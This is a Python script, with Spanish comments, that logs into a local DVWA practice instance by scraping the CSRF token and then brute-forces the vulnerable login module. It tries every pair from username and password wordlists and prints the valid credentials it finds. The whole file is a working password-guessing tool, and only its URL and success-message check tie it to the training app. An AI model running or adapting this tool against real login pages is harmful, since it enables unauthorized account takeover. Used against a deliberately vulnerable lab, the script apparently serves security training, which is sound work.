import requests
import time
from bs4 import BeautifulSoup

# Configuración
dvwa_url = "http://127.0.0.1:8888"
login_url = f"{dvwa_url}/login.php"
brute_url = f"{dvwa_url}/vulnerabilities/brute/"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def load_dictionary(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: No se encontro el archivo {filename}")
        return []

# Función para obtener sesión con token CSRF
def get_dvwa_session():
    session = requests.Session()
    
    # Primero obtener la página de login para extraer el token CSRF
    print("Obteniendo token CSRF...")
    try:
        response = session.get(login_url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})
        
        if user_token:
            user_token_value = user_token['value']
            print(f"Token CSRF obtenido: {user_token_value}")
        else:
            print("No se pudo encontrar el token CSRF")
            return None
    except Exception as e:
        print(f"Error obteniendo token: {e}")
        return None

    # Ahora hacer login con el token
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token_value
    }
    
    print("Iniciando sesión en DVWA...")
    try:
        response = session.post(login_url, data=login_data, headers=headers, timeout=10)
        
        # Verificar login exitoso
        if "PHPSESSID" in session.cookies and "security" in session.cookies:
            print("Sesion iniciada correctamente")
            print(f"Cookies: {dict(session.cookies)}")
            return session
        else:
            print("Error en el login - redirigido a pagina de login")
            return None
            
    except Exception as e:
        print(f"Error de conexion: {e}")
        return None

# Función de fuerza bruta que muestra todos los intentos
def brute_force_attack(session, usernames, passwords):
    successful_logins = []
    attempt_count = 0
    total_attempts = len(usernames) * len(passwords)
    
    print("Iniciando ataque de fuerza bruta...")
    print(f"Total de combinaciones a probar: {total_attempts}")
    print("-" * 60)
    
    start_time = time.time()
    
    # Probar todas las combinaciones
    for username in usernames:
        for password in passwords:
            attempt_count += 1
            params = {
                "username": username,
                "password": password,
                "Login": "Login"
            }
            
            try:
                response = session.get(brute_url, params=params, headers=headers, timeout=5)
                
                # Verificar si es exitoso o no
                if "Welcome to the password protected area" in response.text:
                    print(f"[{attempt_count}/{total_attempts}] CORRECTO: {username}:{password} -> Welcome!")
                    successful_logins.append({"username": username, "password": password})
                elif "Username and/or password incorrect" in response.text:
                    print(f"[{attempt_count}/{total_attempts}] INCORRECTO: {username}:{password} -> Incorrect login")
                elif "login.php" in response.url:
                    print(f"[{attempt_count}/{total_attempts}] ERROR: {username}:{password} -> Redirigido a login (sesion perdida)")
                else:
                    print(f"[{attempt_count}/{total_attempts}] DESCONOCIDO: {username}:{password} -> Respuesta no reconocida")
                        
            except Exception as e:
                print(f"[{attempt_count}/{total_attempts}] ERROR: {username}:{password} -> {e}")
                continue
            
            time.sleep(0.1)
    
    end_time = time.time()
    total_time = end_time - start_time
    
    print("-" * 60)
    print(f"Tiempo total: {total_time:.2f} segundos")
    print(f"Velocidad: {attempt_count/total_time:.2f} intentos/segundo")
    
    return successful_logins

# Ejecutar el script
if __name__ == "__main__":
    print("Iniciando script de fuerza bruta contra DVWA")
    print("=" * 60)
    
    # Cargar diccionarios
    print("Cargando diccionarios...")
    usernames = load_dictionary("usernames.txt")
    passwords = load_dictionary("passwords.txt")
    
    if not usernames or not passwords:
        print("Error: No se pudieron cargar los diccionarios")
        exit()
    
    print(f"Usuarios cargados: {len(usernames)}")
    print(f"Contraseñas cargadas: {len(passwords)}")
    print("=" * 60)
    
    # Obtener sesión
    session = get_dvwa_session()
    if not session:
        print("No se pudo obtener sesion.")
        exit()
    
    # Realizar ataque
    results = brute_force_attack(session, usernames, passwords)
    
    # Mostrar resultados
    print("\nRESULTADOS FINALES:")
    print("=" * 60)
    if results:
        print(f"Se encontraron {len(results)} credenciales validas:")
        for i, cred in enumerate(results, 1):
            print(f"{i}. Usuario: {cred['username']} | Contraseña: {cred['password']}")
    else:
        print("No se encontraron credenciales validas")
    
    print("=" * 60)